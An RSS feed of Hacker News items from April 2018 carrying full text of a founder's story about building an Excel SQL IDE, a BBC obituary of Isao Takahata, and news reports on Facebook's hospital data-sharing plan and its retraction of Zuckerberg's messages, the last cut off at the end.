<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Show HN: I wandered off and built an IDE</title>
<link>http://blog.querystorm.com/index.php/2018/04/04/whynow/</link>
<guid isPermaLink="true" >http://blog.querystorm.com/index.php/2018/04/04/whynow/</guid>
<description>&lt;p&gt;A few years ago, I set out to build a small Excel plugin to help out my girlfriend at the time. I ended up building a full-blown &lt;a href=&quot;https://querystorm.com&quot;&gt;IDE&lt;/a&gt; over the course of four years and spent the winter in Poland in a &lt;a href=&quot;http://hugething.vc&quot;&gt;startup accelerator&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://querystorm.com&quot;&gt;&lt;img src=&quot;https://www.querystorm.com/images/Untitled-Project.gif&quot; alt=&quot;QueryStorm&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;How did this happen? As with many great endeavors of man, this one also started in order to impress a girl.&lt;/p&gt;
&lt;p&gt;Back in 2014, my girlfriend, let’s call her Anna, was having a hard time dealing with data in Excel files. Anna worked in quality control in a large pharma company. Every month or two, she’d start bringing home this soul-crushing pile of Excel files to work on, often over evenings and weekends. I wasn’t too happy about this since I had other plans for our evenings and weekends, but it did give me a chance to show off my superior tech skills so I wasn’t too sad about it. You might be surprised to learn that in a developer’s life, there aren’t all that many chances to impress girls with your coding skills.&lt;/p&gt;
&lt;p&gt;Anyway, I took a look at the Excel files she was bringing home and they were basically huge tables of data exported from various systems. She had to alchemy this data into several reports and the way to do it was to carefully follow the several dozen manual steps that were laid out in an arcane word document prepared by God-only-knows-who some years before. I looked at it carefully, and it turned out that what she needed to do would have been a few 10-line queries in SQL. In Excel, though, it was several days worth of vlookup-index-match-temporarycolumn-pivottable-copypaste-HELL. My first thought was importing the data into a database, processing it there and exporting it back. But this task was something she needed to do often and she didn’t have any database experience so this wasn’t an option.&lt;/p&gt;
&lt;p&gt;So anyway, I had built some plugins for Excel before, and I figured I could probably build something that would automate at least a part of her task, after which I would be seen and admired by her as the hero that I was. The first thing I wanted to implement was joining tables. So, I rolled up my sleeves and eagerly set out to reinvent the wheel. It took about an hour for me to realize that there already existed these mysterious softwares that have the ability to join tables of data. The idea struck me like a lightning bolt: I could put a small database engine (SQLite) into my plugin, load Excel data into it and query the crap out of it six ways from Sunday. In the UI of my plugin, I’d give the handsome user (myself) a textbox for writing the queries and a grid for displaying results. This was going to be great!&lt;/p&gt;
&lt;p&gt;It took a few days to build the first version. It was butt-ugly and looked like it was designed according to whatever the opposite to Feng Shui is, but it worked nicely. I could load data from Excel with the click of a button, type my SQL query into the textbox and run it by pressing “Button2”. Once the plugin was ready, I sat down with a somewhat skeptical Anna and we prepared the queries for her use cases. I was seriously looking forward to the next time Anna would bring home the pile of Excel files. And bring them she did. And work spectacularly it did! Not to brag, but instead of several days, we were done with her reports in about an hour! There was still some manual copy-paste work to do (hence the hour), but the bulk of the work was done by the queries and SQLite.&lt;/p&gt;
&lt;p&gt;“I had done it”… I remember thinking… “I had stared the into the eyes of the Gods of the spreadsheet underworld, and the bastards flinched!”. Anna was impressed (ever so slightly and not nearly enough). Not only did I win Anna’s underwhelming admiration, but this was a general purpose solution that I could sell to other people! It was obvious there was only one way this could go, and only one question to answer: what color mansion would I like?&lt;/p&gt;
&lt;p&gt;So I posted about my plugin on Reddit/r/excel. The &lt;a href=&quot;https://www.reddit.com/r/excel/comments/2wv52m/ive_built_an_excel_plugin_for_using_sql_in_excel/&quot;&gt;response&lt;/a&gt; was very enthusiastic, people loved it! Close to 100 upvote’s worth of love. Encouraged, I continued working on it much to Anna’s annoyance, because now, instead of her spending time in Excel, I was. At one point she got so annoyed that she gave me an ultimatum: either her or the project.&lt;/p&gt;
&lt;p&gt;Anyway, the Reddit reception was encouraging but for some strange reason, I did not have thousands of people beating a path to my door to buy some licenses the next morning. It was quite obvious that there was something wrong with all these people who weren’t lining up to buy. After all, my ex-girlfriend Anna saves several days each month with it, and she can’t be the only one who could make good use of it. Perhaps the problem is auto-complete. Any serious tool needs autocomplete these days…&lt;/p&gt;
&lt;p&gt;What was I to do, my turquoise mansion was waiting for me just one auto-complete feature away. So, I dusted off my compiler theory books from college, picked up Antlr and built a parser for SQLite (with the help of a &lt;a href=&quot;https://github.com/antlr/grammars-v4/blob/master/sqlite/SQLite.g4&quot;&gt;SQLite grammar&lt;/a&gt; I found on GitHub). This was my favorite feature to build. With the parser in place, one by one I added all the cool features: auto-complete, error highlighting, symbol tooltips, bracket-matching, code formatting, function insights and star expansion. Then I added the ability to use external databases instead of SQLite, which made it possible to process Excel data with an external database but also to easily move data between Excel and databases. This was great: posts on Reddit, posts on HackerNews, money rolling in, licenses being bought. Still, it was only a few hundred – maybe up to a few thousand dollars per month. Careful calculations conclusively showed it wasn’t enough for a mansion.&lt;/p&gt;
&lt;p&gt;But, it was fun, and my corporate job wasn’t. I decided to quit and devote my time to a worthy project: my Excel plugin. Being a techy person, I wasn’t very keen to do any marketing and sales, though. I didn’t need those. So, fast forward to today, I completely ignored the business side of it and continued developing what I felt like developing. Inevitably, after a while, I was slowly starting to go broke, but I had a lot of fun developing features, yay! For example, I took Roslyn and used it to add C# support, intellisense and all. LINQ queries on Excel tables, for God’s sake, you can’t tell me that doesn’t make your heart beat just a little bit faster.&lt;/p&gt;
&lt;p&gt;At this point, a reasonable question to ask might be: “Why in God’s name would you build an IDE in Excel, I thought developers hate Excel?!”. And you’d be right, most developers don’t care much for Excel, but that’s only because it doesn’t actually let them use their tech skills. But not everyone is technical, and spreadsheets are almost everywhere, especially in companies. Working with this data and getting data in and out of spreadsheets is a tedious process. Good tech tools would make dealing with data in spreadsheets a whole lot easier. Additionally, imagine how much easier it would be to build prototypes and small applications if instead of VBA you could use C# (and LINQ) in Excel. You could write business logic in C#, load data from all sorts of APIs and use Excel for everything else: storage, user interactions, and visualizations. Having Excel as part of your application could give you a whole lot of functionality for free. Excel might not seem fashionable, but it’s really useful and in business, you can pretty much count on most people having it on their machines.&lt;/p&gt;
&lt;p&gt;So here are some of the interesting things you can do with QueryStorm:&lt;br/&gt;– &lt;a href=&quot;https://www.querystorm.com/docs/csharp&quot;&gt;Using C# in Excel&lt;/a&gt;&lt;br/&gt;– &lt;a href=&quot;http://blog.querystorm.com/index.php/2018/04/02/querying-other-databases-from-sqlite/&quot;&gt;Cross-database queries from SQLite&lt;/a&gt;&lt;br/&gt;– &lt;a href=&quot;http://blog.querystorm.com/index.php/2018/03/31/sqlite-with-c-sprinkles-on-top/&quot;&gt;C# user-defined functions for SQLite (in Excel)&lt;/a&gt;&lt;br/&gt;– &lt;a href=&quot;http://blog.querystorm.com/index.php/2018/03/30/c-programming-in-excel/&quot;&gt;Prototyping with C# and Excel&lt;/a&gt;&lt;br/&gt;– &lt;a href=&quot;http://blog.querystorm.com/index.php/2018/03/26/regex-magic-in-excel/&quot;&gt;Regex galore in Excel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Anyway, a few months ago, by chance, a guy I know asked me if I wanted to apply to this Polish accelerator. I said, “Yeah, sure, sounds good”. He saw right through my cunning attempt at blowing him off and said “no yeah sure… APPLY, NOW MOT&amp;amp;ast;&amp;amp;ast;&amp;amp;ast;&amp;amp;ast;&amp;amp;ast;&amp;amp;ast;&amp;amp;ast;ER!”. Well, apply I did, and it was fantastic. I spent four months in Warsaw, met a bunch of really cool people, got some new friends, got financing and some useful new skills like presenting. Could have been worse, all in all. I’m really grateful both to Luka (the super cool dude who made me apply) as well as to the &lt;a href=&quot;http://hugething.vc&quot;&gt;HugeThing&lt;/a&gt; team. If QueryStorm succeeds on the market, it will be in no small part thanks to theese amazing gentlefolk!&lt;/p&gt;
&lt;p&gt;So anyway, I have this IDE… &lt;a href=&quot;https://www.querystorm.com&quot;&gt;wanna check it out&lt;/a&gt;?&lt;/p&gt;
</description>
<pubDate>Fri, 06 Apr 2018 10:54:25 +0000</pubDate>
<dc:creator>anakic</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://blog.querystorm.com/index.php/2018/04/04/whynow/</dc:identifier>
</item>
<item>
<title>Japanese anime director Isao Takahata has died</title>
<link>http://www.bbc.co.uk/news/world-asia-43664515</link>
<guid isPermaLink="true" >http://www.bbc.co.uk/news/world-asia-43664515</guid>
<description>&lt;figure class=&quot;media-landscape has-caption full-width lead&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                &lt;img class=&quot;js-image-replace&quot; alt=&quot;This picture taken on April 7, 2015 shows Japanese animation movie director Isao Takahata smiling as he received the 'Officier of L'Ordre des Arts et des Letters'&quot; src=&quot;https://ichef.bbci.co.uk/news/320/cpsprodpb/EE0E/production/_100724906_gettyimages-468878072.jpg&quot; width=&quot;976&quot; height=&quot;549&quot;/&gt;&lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;Getty Images&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Mr Takahata was awarded France's Order of Arts and Letters in 2015
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;Japanese anime director Isao Takahata, co-founder of the famed Studio Ghibli, has died at the age of 82.&lt;/p&gt;&lt;p&gt;Mr Takahata was nominated for an Oscar in 2015 for The Tale of the Princess Kaguya but is best known for his film Grave of the Fireflies. &lt;/p&gt;&lt;p&gt;He founded Studio Ghibli with iconic director Hayao Miyazaki in 1985.&lt;/p&gt;&lt;p&gt;It became a world-renowned animation studio, producing blockbusters such as Castle in the Sky, and Nausicaä of the Valley of the Wind.&lt;/p&gt;&lt;p&gt;Mr Takahata started his career in animation in 1959 at Japan's Toei studio, where he met Mr Miyazaki, who is usually seen as the face of Studio Ghibli.&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;Shutterstock&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Grave of the Fireflies told the story of two siblings trying to survive during World War Two
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The duo went on to co-found Studio Ghibli, and were described by local media as both friends and rivals.&lt;/p&gt;&lt;p&gt;Mr Takahata's film The Tale of the Princess Kaguya earned him an Academy Award nomination in 2015 for best animated feature.&lt;/p&gt;&lt;p&gt;But his most loved work was the 1988 film Grave of the Fireflies, a heartbreaking tale of two orphans during World War Two. &lt;/p&gt;&lt;p&gt;Filmmakers and animators have been paying tribute to him on social media.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption body-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;Other news from the BBC today:&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.bbc.co.uk/news/world-asia-india-43666757&quot; class=&quot;story-body__link&quot;&gt;Man 'kept mother's frozen body' for years&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.bbc.co.uk/news/world-asia-43551255&quot; class=&quot;story-body__link&quot;&gt;Will Netflix's Amo be the Philippine Narcos? &lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.bbc.co.uk/news/world-australia-43509680&quot; class=&quot;story-body__link&quot;&gt;Are 'quokka selfies' cause for concern?&lt;/a&gt;&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption body-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;</description>
<pubDate>Fri, 06 Apr 2018 06:20:19 +0000</pubDate>
<dc:creator>zeristor</dc:creator>
<og:title>Anime film legend Takahata dies</og:title>
<og:type>article</og:type>
<og:description>Isao Takahata helped create some of Studio Ghibli's most famous works, including Grave of the Fireflies.</og:description>
<og:url>http://www.bbc.co.uk/news/world-asia-43664515</og:url>
<og:image>https://ichef-1.bbci.co.uk/news/1024/branded_news/EE0E/production/_100724906_gettyimages-468878072.jpg</og:image>
<dc:language>en-GB</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.bbc.co.uk/news/world-asia-43664515</dc:identifier>
</item>
<item>
<title>Facebook was in talks with hospitals about a proposal to share data</title>
<link>https://www.cnbc.com/2018/04/05/facebook-building-8-explored-data-sharing-agreement-with-hospitals.html</link>
<guid isPermaLink="true" >https://www.cnbc.com/2018/04/05/facebook-building-8-explored-data-sharing-agreement-with-hospitals.html</guid>
<description>&lt;div class=&quot;group&quot; itemprop=&quot;articleBody&quot;&gt;
&lt;p&gt;&lt;a class=&quot;inline_quotes&quot; data-gdsid=&quot;139619&quot; data-inline-quote-symbol=&quot;FB&quot; href=&quot;https://www.cnbc.com/quotes/?symbol=FB&quot;&gt;Facebook&lt;/a&gt; has asked several major U.S. hospitals to share anonymized data about their patients, such as illnesses and prescription info, for a proposed research project. Facebook was intending to match it up with user data it had collected, and help the hospitals figure out which patients might need special care or treatment.&lt;/p&gt;
&lt;p&gt;The proposal never went past the planning phases and has been put on pause after the &lt;a href=&quot;https://www.cnbc.com/2018/03/21/facebook-cambridge-analytica-scandal-everything-you-need-to-know.html&quot;&gt;Cambridge Analytica data leak scandal&lt;/a&gt; raised public concerns over how Facebook and others collect and use detailed information about Facebook users.&lt;/p&gt;
&lt;p&gt;&quot;This work has not progressed past the planning phase, and we have not received, shared, or analyzed anyone's data,&quot; a Facebook spokesperson told CNBC.&lt;/p&gt;

&lt;p&gt;But as recently as last month, the company was talking to several health organizations, including Stanford Medical School and American College of Cardiology, about signing the data-sharing agreement.&lt;/p&gt;
&lt;/div&gt;&lt;div class=&quot;group&quot; itemprop=&quot;articleBody&quot;&gt;
&lt;p&gt;While the data shared would obscure personally identifiable information, such as the patient's name, Facebook proposed using a common computer science technique called &quot;hashing&quot; to match individuals who existed in both sets. Facebook says the data would have been used only for research conducted by the medical community.&lt;/p&gt;
&lt;p&gt;The project could have raised new concerns about the massive amount of data Facebook collects about its users, and how this data can be used in ways users never expected.&lt;/p&gt;
&lt;p&gt;That issue has been in the spotlight after &lt;a class=&quot;inline_asset&quot; href=&quot;https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html&quot; title=&quot;https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html&quot;&gt;reports&lt;/a&gt; that Cambridge Analytica, a political research organization that did work for Donald Trump, improperly got ahold of detailed information about Facebook users without their permission. It then tried to use this data to target political ads to them.&lt;/p&gt;
&lt;p&gt;Facebook said on Wednesday that as many as &lt;a href=&quot;https://www.cnbc.com/2018/04/04/facebook-updates-the-number-of-users-impacted-by-cambridge-analytica-leak-to-87-million-.html&quot;&gt;87 million people's data&lt;/a&gt; might have been shared this way. The company has recently announced new &lt;a href=&quot;https://www.cnbc.com/2018/03/28/facebook-unveils-new-privacy-tools-to-let-you-control-your-data-better.html&quot;&gt;privacy policies&lt;/a&gt; and controls meant to restrict the type of data it collects and shares, and how that data can be used.&lt;/p&gt;
&lt;/div&gt;&lt;div class=&quot;group&quot; itemprop=&quot;articleBody&quot;&gt;
&lt;p&gt;The exploratory effort to share medical-related data was led by an interventional cardiologist called Freddy Abnousi, who describes his role on LinkedIn as &quot;leading top-secret projects.&quot; It was under the purview of Regina Dugan, the head of Facebook's &quot;Building 8&quot; experiment projects group, before she left in October 2017.&lt;/p&gt;
&lt;p&gt;Facebook's pitch, according to two people who heard it and one who is familiar with the project, was to combine what a health system knows about its patients (such as: person has heart disease, is age 50, takes 2 medications and made 3 trips to the hospital this year) with &lt;a href=&quot;https://www.cnbc.com/2017/11/17/how-to-find-out-what-facebook-knows-about-me.html&quot;&gt;what Facebook knows&lt;/a&gt; (such as: user is age 50, married with 3 kids, English isn't a primary language, actively engages with the community by sending a lot of messages).&lt;/p&gt;
&lt;p&gt;The project would then figure out if this combined information could improve patient care, initially with a focus on cardiovascular health. For instance, if Facebook could determine that an elderly patient doesn't have many nearby close friends or much community support, the health system might decide to send over a nurse to check in after a major surgery.&lt;/p&gt;
&lt;p&gt;The people declined to be named as they were asked to sign confidentiality agreements.&lt;/p&gt;
&lt;p&gt;Facebook provided a quote from Cathleen Gates, the interim CEO of the American College of Cardiology, explaining the possible benefits of the plan:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&quot;For the first time in history, people are sharing information about themselves online in ways that may help determine how to improve their health. As part of its mission to transform cardiovascular care and improve heart health, the American College of Cardiology has been engaged in discussions with Facebook around the use of anonymized Facebook data, coupled with anonymized ACC data, to further scientific research on the ways social media can aid in the prevention and treatment of heart disease—the #1 cause of death in the world. This partnership is in the very early phases as we work on both sides to ensure privacy, transparency and scientific rigor. No data has been shared between any parties.&quot;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Health systems are notoriously careful about sharing patient health information, in part because of state and federal patient privacy laws that are designed to ensure that people's sensitive medical information doesn't end up in the wrong hands.&lt;/p&gt;
&lt;p&gt;To address these privacy laws and concerns, Facebook proposed to obscure personally identifiable information, such as names, in the data being shared by both sides.&lt;/p&gt;
&lt;p&gt;However, the company proposed using a common cryptographic technique called hashing to match individuals who were in both data sets. That way, both parties would be able to tell when a specific set of Facebook data matched up with a specific set of patient data.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;The issue of patient consent did not come up in the early discussions, one of the people said. Critics have attacked Facebook in the past for doing research on users without their permission. Notably, in 2014, Facebook &lt;a class=&quot;inline_asset&quot; href=&quot;https://www.nytimes.com/2014/06/30/technology/facebook-tinkers-with-users-emotions-in-news-feed-experiment-stirring-outcry.html&quot; title=&quot;https://www.nytimes.com/2014/06/30/technology/facebook-tinkers-with-users-emotions-in-news-feed-experiment-stirring-outcry.html&quot;&gt;manipulated&lt;/a&gt; hundreds of thousands of people's news feeds to study whether certain types of content made people happier or sadder. Facebook later apologized for the study.&lt;/p&gt;
&lt;p&gt;Health policy experts say that this health initiative would be problematic if Facebook did not think through the privacy implications.&lt;/p&gt;
&lt;p&gt;&quot;Consumers wouldn't have assumed their data would be used in this way,&quot; said Aneesh Chopra, president of a health software company specializing in patient data called CareJourney and the former White House chief technology officer.&lt;/p&gt;
&lt;p&gt;&quot;If Facebook moves ahead (with its plans), I would be wary of efforts that repurpose user data without explicit consent.&quot;&lt;/p&gt;
&lt;p&gt;When asked about the plans, Facebook provided the following statement:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&quot;The medical industry has long understood that there are general health benefits to having a close-knit circle of family and friends. But deeper research into this link is needed to help medical professionals develop specific treatment and intervention plans that take social connection into account.&quot;&lt;/p&gt;
&lt;p&gt;&quot;With this in mind, last year Facebook began discussions with leading medical institutions, including the American College of Cardiology and the Stanford University School of Medicine, to explore whether scientific research using anonymized Facebook data could help the medical community advance our understanding in this area. This work has not progressed past the planning phase, and we have not received, shared, or analyzed anyone's data.&quot;&lt;/p&gt;
&lt;p&gt;&quot;Last month we decided that we should pause these discussions so we can focus on other important work, including doing a better job of protecting people's data and being clearer with them about how that data is used in our products and services.&quot;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Facebook has taken only tentative steps into the health sector thus far, such as its campaign to promote organ donation through the social network. It also has a growing &lt;a href=&quot;https://www.cnbc.com/2017/05/26/facebook-health-summit-june-6-will-focus-on-pharma-cannes-to-follow.html&quot;&gt;&quot;Facebook health&quot; team based in New York&lt;/a&gt; that is pitching pharmaceutical companies to invest its ample ad budget into Facebook by targeting users who &quot;liked&quot; a health advocacy page, or fits a certain demographic profile.&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Fri, 06 Apr 2018 05:15:45 +0000</pubDate>
<dc:creator>WizardOfNomaha</dc:creator>
<og:type>article</og:type>
<og:url>https://www.cnbc.com/2018/04/05/facebook-building-8-explored-data-sharing-agreement-with-hospitals.html</og:url>
<og:image>https://fm.cnbc.com/applications/cnbc.com/resources/img/editorial/2018/04/05/105112385-GettyImages-622247700.1910x1000.jpg</og:image>
<og:title>Facebook sent a doctor on a secret mission to ask hospitals to share patient data</og:title>
<og:description>Facebook's Building 8 team approached top hospitals about a data-sharing agreement, but the plan has been put on pause after the Cambridge Analytica data leak scandal.</og:description>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnbc.com/2018/04/05/facebook-building-8-explored-data-sharing-agreement-with-hospitals.html</dc:identifier>
</item>
<item>
<title>Facebook retracted Zuckerberg’s messages from recipients’ inboxes</title>
<link>https://techcrunch.com/2018/04/05/zuckerberg-deleted-messages</link>
<guid isPermaLink="true" >https://techcrunch.com/2018/04/05/zuckerberg-deleted-messages</guid>
<description>&lt;p&gt;&lt;span class=&quot;featured__span-first-words&quot;&gt;You can’t remove&lt;/span&gt; Facebook messages from the inboxes of people you sent them to, but &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://www.crunchbase.com/organization/facebook/&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;facebook&quot;&gt;Facebook&lt;/a&gt; did that for Mark Zuckerberg and other executives. Three sources confirm to TechCrunch that old Facebook messages they received from Zuckerberg have disappeared from their Facebook inboxes, while their own replies to him conspiculously remain. An email receipt of a Facebook message from 2010 reviewed by TechCrunch proves Zuckerberg sent people messages that no longer appear in their Facebook chat logs or in the files available from Facebook’s Download Your Information tool.&lt;/p&gt;
&lt;p&gt;When asked by TechCrunch about the situation, Facebook claimed it was done for corporate security in this statement:&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;img class=&quot;alignright wp-image-1617782&quot; src=&quot;https://techcrunch.com/wp-content/uploads/2018/04/facebook-messenger-2011.png?w=356&quot; alt=&quot;&quot; width=&quot;309&quot; height=&quot;211&quot;/&gt;“After Sony Pictures’ emails were hacked in 2014 we made a number of changes to protect our executives’ communications. These included limiting the retention period for Mark’s messages in Messenger. We did so in full compliance with our legal obligations to preserve messages.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;However, Facebook never publicly disclosed the removal of messages from users’ inboxes, nor privately informed the recipients. That raises the question of whether this was a breach of user trust. When asked that question directly over Messenger, Zuckerberg declined to provide a statement.&lt;/p&gt;
&lt;h2&gt;Tampering With Users’ Inboxes&lt;/h2&gt;
&lt;p&gt;A Facebook spokesperson confirmed to TechCrunch that users can only delete messages their own inboxes, and that they would still show up in the recipient’s thread. There appears to be no “retention period” for normal users’ messages, as my inbox shows messages from as early as 2005. That indicates Zuckerberg and other executives received special treatment in being able to pull back previously sent messages.&lt;/p&gt;
&lt;p&gt;[&lt;strong&gt;Update 4/6/2018:&lt;/strong&gt; &lt;a href=&quot;https://techcrunch.com/2018/04/06/facebook-unsend-messages/&quot;&gt;Facebook now says that it plans to launch an “unsend” feature&lt;/a&gt; for Facebook messages to all users in the next several months, and won’t let Mark Zuckerberg use that feature any more until it launches for everyone.]&lt;/p&gt;

&lt;p&gt;Facebook chats sent by Zuckerberg from several years ago or older were missing from the inboxes of both former employees and non-employees. What’s left makes it look the recipients were talking to themselves, as only their side of back-and-forth conversations with Zuckerberg still appear. Three sources asked to remain anonymous out of fear of angering Zuckerberg or burning bridges with the company.&lt;/p&gt;
&lt;p&gt;[Update: Recent messages from Zuckerberg remain in users’ inboxes. Old messages from before 2014 still appear to some users, indicating the retraction did not apply to all chats the CEO sent. But more sources have come forward since publication, saying theirs disappeared as well.]&lt;/p&gt;
&lt;p&gt;None of &lt;a href=&quot;https://www.facebook.com/terms.php&quot;&gt;Facebook’s terms of service&lt;/a&gt; appear to give it the right to remove content from users’ accounts unless it violates the company’s community standards. While it’s somewhat standard for corporations to have data retention policies that see them delete emails or other messages from their own accounts that were sent by employees, they typically can’t remove the messages from the accounts of recipients outside the company. It’s rare that these companies own the communication channel itself and therefore host both sides of messages as Facebook does in this case, which potentially warrants a different course of action with more transparency than quietly retracting the messages.&lt;/p&gt;
&lt;p&gt;Facebook’s power to tamper with users’ private message threads could alarm some. The issue is amplified by the fact that Facebook Messenger now has 1.3 billion users, making it one of the most popular communication utilities in the world.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-large wp-image-1617781&quot; src=&quot;https://techcrunch.com/wp-content/uploads/2018/04/facebook-messenger-1-3-billion-monthly-active-users.png?w=680&quot; alt=&quot;&quot; width=&quot;680&quot; height=&quot;383&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Zuckerberg is known to have &lt;a href=&quot;https://www.bloomberg.com/news/articles/2017-01-18/this-team-runs-mark-zuckerberg-s-facebook-page&quot;&gt;a team that helps him run his Facebook profile&lt;/a&gt;, with some special abilities for managing his 105 million followers and constant requests for his attention. For example, Zuckerberg’s profile doesn’t show a button to add him as a friend on desktop, and the button is grayed out and disabled on mobile. But the ability to change the messaging inboxes of other users is far more concerning.&lt;/p&gt;
&lt;p&gt;Facebook may have sought to prevent leaks of sensitive corporate communications. Following the Sony hack, emails of Sony’s president Michael Lynton who sat on Snap Inc’s board were exposed, &lt;a href=&quot;https://techcrunch.com/2014/12/16/snapchat-emails-not-so-ephemeral/&quot;&gt;revealing secret acquisitions and strategy&lt;/a&gt;.&lt;/p&gt;
&lt;div id=&quot;attachment_1617785&quot; class=&quot;wp-caption alignright&quot; readability=&quot;32&quot;&gt;&lt;img class=&quot;vertical wp-image-1617785 size-large&quot; src=&quot;https://techcrunch.com/wp-content/uploads/2018/04/mark-zuckerberg-young.png?w=313&quot; alt=&quot;&quot; width=&quot;313&quot; height=&quot;469&quot;/&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Mark Zuckerberg during the early days of Facebook&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;However, Facebook may have also looked to thwart the publication of potentially embarrassing personal messages sent by Zuckerberg or other executives. In 2010, &lt;a href=&quot;http://www.businessinsider.com/well-these-new-zuckerberg-ims-wont-help-facebooks-privacy-problems-2010-5&quot;&gt;Silicon Alley Insider &lt;/a&gt;published now-infamous instant messages from a 19-year-old Zuckerberg to a friend shortly after starting The Facebook in 2004. “yea so if you ever need info about anyone at harvard . . . just ask . . . i have over 4000 emails, pictures, addresses, sns” Zuckerberg wrote to a friend. “what!? how’d you manage that one?” they asked. “people just submitted it . .  i don’t know why . . . they “trust me” . . . dumb fucks” Zuckerberg explained.&lt;/p&gt;
&lt;p&gt;The New Yorker later confirmed the messages with Zuckerberg, who told the publication he “absolutely” regretted them. “If you’re going to go on to build a service that is influential and that a lot of people rely on, then you need to be mature, right? I think I’ve grown and learned a lot” said Zuckerberg.&lt;/p&gt;
&lt;p&gt;If the goal of Facebook’s security team was to keep a hacker from accessing the accounts of executives and therefore all of their messages, they could have merely been deleted on their side the way any Facebook user is free to do, without them disappearing from the various recipients’ inboxes. If Facebook believed it needed to remove the messages entirely from its servers in case the company’s backend systems we breached, a disclosure of some kind seems reasonable.&lt;/p&gt;
&lt;p&gt;Now as Facebook encounters increased scrutiny regarding how it treats users’ data in the wake of the Cambridge Analytica scandal, the retractions could become a bigger issue. Zuckerberg is slated to speak in front of the U.S. Senate Judiciary and Commerce committees on April 10 as well as the House Energy and Commerce Committee on April 11. They could request more information about Facebook removing messages or other data from users’ accounts without their consent. While Facebook is trying to &lt;a href=&quot;https://techcrunch.com/2018/04/04/zuckerberg-raw/&quot;&gt;convey that it understands its responsibilities&lt;/a&gt;, the black mark left on public opinion by past behavior may prove permanent.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;If you have more info on this situation, including evidence of messages from other Facebook executives disappearing, please &lt;a href=&quot;https://twitter.com/JoshConstine/&quot;&gt;contact this article’s author Josh Constine via open Twitter DMs&lt;/a&gt;, josh@techcrunch.com, or encrypted Signal chat at (585)750-5674.&lt;/em&gt;&lt;/p&gt;
